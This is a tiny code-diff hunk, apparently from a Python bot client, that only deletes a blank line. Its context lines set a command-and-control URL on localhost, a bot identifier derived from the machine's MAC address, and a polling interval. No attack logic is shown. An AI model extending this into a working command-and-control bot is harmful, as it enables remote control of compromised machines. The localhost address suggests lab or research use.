@@ -7,7 +7,6 @@ import re, uuid
 import platform
 import random
 
-
 C2_URL = "http://127.0.0.1:8000/control/"
 BOT_ID = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 POLLING_INTERVAL = 30
